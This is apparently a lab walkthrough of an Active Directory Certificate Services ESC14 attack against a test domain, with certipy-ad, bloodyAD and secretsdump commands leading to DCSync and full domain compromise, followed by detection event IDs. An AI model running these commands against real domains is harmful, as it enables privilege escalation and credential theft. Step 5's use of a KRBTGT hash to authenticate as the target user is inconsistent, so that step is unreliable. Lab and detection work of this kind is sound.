# WT#061 — ESC14: Weak Explicit Certificate Mapping

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | dc01 (192.168.77.10) |
| **Domain** | cadre.local |
| **CA** | cadre-CA |
| **Template** | CADRE-ESC14 |
| **Starting Credential** | analyst_dfir / An@lyst_DF1R! |
| **Tools Required** | certipy-ad, bloodyAD |
| **Certifications** | ADCS |
| **MITRE ATT&CK** | T1649 |
| **Difficulty** | Hard |

## Prerequisites
- CA service running on dc01
- `CADRE-ESC14` template published
- `analyst_dfir` has `GenericWrite` on a target user (e.g., `chief_command`)
- Target user has `altSecurityIdentities` attribute writable

## Attack Steps

### 1. Enumerate ESC14 template and GenericWrite targets
```powershell
certipy-ad find -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -target 192.168.77.10 -vuln -enabled
```

### 2. Enroll certificate with desired subject
```powershell
certipy-ad req -ca cadre-CA -template CADRE-ESC14 -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -target 192.168.77.10
```

### 3. Write certificate to target's altSecurityIdentities
```powershell
# Extract cert hash from PFX
certipy-ad cert -pfx analyst_dfir.pfx -export

# Write altSecurityIdentities on chief_command using bloodyAD
bloodyAD --host 192.168.77.10 -d cadre.local -u analyst_dfir -p 'An@lyst_DF1R!' set object chief_command altSecurityIdentities "<CERTIFICATE_ISSUER><CERTIFICATE_SUBJECT>"
```

### 4. Authenticate as chief_command using the mapped certificate
```powershell
certipy-ad auth -pfx analyst_dfir.pfx -dc-ip 192.168.77.10 -domain cadre.local
```

### 5. DCSync
```powershell
impacket-secretsdump -just-dc 'cadre.local/chief_command@192.168.77.10' -hashes :<KRBTGT_HASH>
```

## Post-Exploitation Chain
ESC14 → GenericWrite → altSecurityIdentities mapping → Authentication as DA → DCSync (WT#009) → Full domain compromise (cadre.local)

## Telemetry Verification
- **Event 4887**: CADRE-ESC14 enrollment
- **Event 5136**: `altSecurityIdentities` attribute modified on chief_command
- **Event 4662**: Write operation on chief_command's `altSecurityIdentities`
- **Event 4768**: Kerberos TGT issued for chief_command using certificate mapping
- **Sysmon Event 1**: certipy-ad, bloodyAD process creation
## Status
CONFIGURED — CA cadre-CA running, ESC14 explicit mapping template published
